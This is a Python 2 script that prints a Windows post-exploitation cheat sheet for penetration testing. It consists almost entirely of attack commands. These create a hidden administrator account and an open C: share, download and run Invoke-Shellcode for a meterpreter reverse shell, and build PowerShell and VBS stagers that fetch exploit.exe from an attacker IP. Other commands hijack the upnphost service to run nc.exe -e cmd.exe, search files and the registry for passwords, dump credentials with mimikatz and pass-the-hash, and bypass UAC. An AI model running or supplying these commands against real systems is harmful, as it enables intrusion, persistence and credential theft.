#!/usr/bin/python
import sys
import os
from netifaces import interfaces, ifaddresses, AF_INET

if len(sys.argv) == 1:
    print "\nwindows cheet sheet \n"
    print "usage: \n"
    print "%s <add> <user>" %sys.argv[0]
    print "%s <nishang>" %sys.argv[0]
    print "%s <invokeshellcode>" %sys.argv[0]
    print "%s <wget> <vbs>" %sys.argv[0]
    print "%s <powershell> <download>" %sys.argv[0]
    print "%s <powershell> <quick>" %sys.argv[0]
    print "%s <cmd>" %sys.argv[0]
    print "%s <wmi>" %sys.argv[0]

elif str(sys.argv[1]) == 'add' and (sys.argv[2]) == 'user':
    print """
net user /add JT JT1234567890_
net localgroup administrators JT /add
net localgroup "Remote Desktop Users" JT /add
net share concfg*C:\/grant:JT,full
net share SHARE_NAME=c:\ /grant:JT,full
"""

elif str(sys.argv[1]) == 'nishang':
    nishang="echo /usr/share/nishang && ls --color=always /usr/share/nishang"
    os.system(nishang)

elif str(sys.argv[1]) == 'invokeshellcode':
    invokeshellcode="echo /opt/Old-Invoke--Shellcode/ && ls --color=always /opt/Old-Invoke--Shellcode/"
    os.system(invokeshellcode)
    print "\npython /opt/Old-Invoke--Shellcode/ StartListener.py LHOST LPORT"
    print """\nPowershell.exe -NoP -NonI -Exec BypassIEX (New-Object Net.WebClient).DownloadString("https://yourwebserver/Invoke--Shellcode.ps1"); -Payload windows/meterpreter/reverse_https -Lhost YOURIP -Lport CALLBACK_PORT -Force"""

    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
        print '%s: %s' % (ifaceName, ', '.join(addresses))
    print "\nquick web server\npython -m SimpleHTTPServer 8080"

elif str(sys.argv[1]) == 'powershell' and (sys.argv[2]) == 'download':
    print "\n powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
    wget="""
echo "$storageDir = $pwd "> wget.ps1
echo "$webclient = New-Object System.Net.WebClient ">>wget.ps1
echo "$url = "http://IP/exploit.exe" ">>wget.ps1
echo "$file = "new-exploit.exe" ">>wget.ps1
echo "$webclient.DownloadFile($url,$file)" >>wget.ps1
    """
    os.system(wget)

    print """\nPowershell.exe -exec bypass IEX "(New-Object Net.WebClient).DownloadString('http://'IP_PATH');command from script \n"""
    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
        print '%s: %s' % (ifaceName, ', '.join(addresses))
    print "\nquick web server\npython -m SimpleHTTPServer 8080"

elif str(sys.argv[1]) == 'cmd':
    print "\nwhoami /all && ipconfig /all && netstat -ano && net accounts && net localgroup administrators && net share"
    print """\nsysteminfo | findstr /B /C:"OS Name" /C:"OS Version" """
    print """\n
    hostname
    echo %username%
    net users
    net user <username>
    """
    print "\necho %\path% "
    print """\n
    ipconfig /all
    route print
    arp -A
    netstat -ano
    netsh firewall show state
    netsh firewall show config
    """
    print """\n
    schtasks /query /fo LIST /v
    tasklist /SVC
    """

    print "netsh firewall set service remoteadmin enable"
    print "netsh firewall set service remotedesktop enable"

    print "\nnet start"
    print "\ndir /s *pass* == *cred* == *vnc* == *.config* "
    print "\nfindstr /si password *.xml *.ini *.txt "
    print "\nreg query HKLM /f password /t REG_SZ /s"
    print "\nreg query HKCU /f password /t REG_SZ /s"
    print """\n
    sc qc Spooler
    sc qc upnphost
    sc config upnphost binpath= "c:\Inetpub\Scripts\/nc.exe -nv IP PORT -e C:\WINDOWS\System32\cmd.exe"
    sc config upnphost obj= ".\LocalSystem" password= ""
    sc qc upnphost
    net start upnphost
    """

elif str(sys.argv[1]) == 'mimikatz':
    print "https://github.com/gentilkiwi/mimikatz"
    print "privilege::debug"
    print "sekurlsa::logonpasswords"
    print "sekurlsa::pth /user: /domain: /ntlm: /run:cmd"

elif str(sys.argv[1]) == 'wmi':
    print "\nwmic process get caption,executablepath,commandline /format:csv"
    print "\nwmic useraccount get /ALL /format:csv"
    print "\nwmic qfe get Caption,Description,HotFixID,InstalledOn"
    print """\nwmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.." """
    print """\n
    wmic process get CSName,Description,ExecutablePath,ProcessId /format:"%var%" >> out.html
    wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:"%var%" >> out.html
    wmic USERACCOUNT list full /format:"%var%" >> out.html
    wmic group list full /format:"%var%" >> out.html
    wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:"%var%" >> out.html
    wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:"%var%" >> out.html
    wmic netuse list full /format:"%var%" >> out.html
    wmic qfe get Caption,Description,HotFixID,InstalledOn /format:"%var%" >> out.html
    wmic startup get Caption,Command,Location,User /format:"%var%" >> out.html
    wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:"%var%" >> out.html
    wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:"%var%" >> out.html
    wmic Timezone get DaylightName,Description,StandardName /format:"%var%" >> out.html"""

elif str(sys.argv[1]) == 'powershell' and (sys.argv[2]) == 'quick':
    print "\npowershell.exe -command Get-Service"
    print "\npowershell.exe -command Get-Process"
    print "\npowershell.exe -command Get-HotFix"
    print "\npowershell.exe -command Restart-Service"
    print """\npowershell.exe -command set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0""" #RDP
    print """\npowershell.exe -command Enable-NetFirewallRule -DisplayGroup "Remote Desktop" """ #enableFWRDP
    print """\nPowershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://webserver/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1')""" #bypassUAC

elif str(sys.argv[1]) == "wget" and (sys.argv[2]) == 'vbs':
    print "cscript wget.vbs http://MYIP/EXPLOIT.exe EXPLOIT.exe"
    wget="""echo "strUrl = WScript.Arguments.Item(0)" > wget.vbs
echo "StrFile = WScript.Arguments.Item(1)" >> wget.vbs
echo "Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0" >> wget.vbs
echo "Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0" >> wget.vbs
echo "Const HTTPREQUEST_PROXYSETTING_DIRECT = 1" >> wget.vbs
echo "Const HTTPREQUEST_PROXYSETTING_PROXY = 2" >> wget.vbs
echo "Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts" >> wget.vbs
echo "Err.Clear" >> wget.vbs
echo "Set http = Nothing" >> wget.vbs
echo "Set http = CreateObject("WinHttp.WinHttpRequest.5.1")" >> wget.vbs
echo "If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")" >> wget.vbs
echo "If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")" >> wget.vbs
echo "If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")" >> wget.vbs
echo "http.Open "GET", strURL, False" >> wget.vbs
echo "http.Send" >> wget.vbs
echo "varByteArray = http.ResponseBody" >> wget.vbs
echo "Set http = Nothing" >> wget.vbs
echo "Set fs = CreateObject("Scripting.FileSystemObject")" >> wget.vbs
echo "Set ts = fs.CreateTextFile(StrFile, True)" >> wget.vbs
echo "strData = "" " >> wget.vbs
echo "strBuffer = "" " >> wget.vbs
echo "For lngCounter = 0 to UBound(varByteArray)" >> wget.vbs
echo "ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))" >> wget.vbs
echo "Next" >> wget.vbs
echo "ts.Close" >> wget.vbs"""
    os.system(wget)
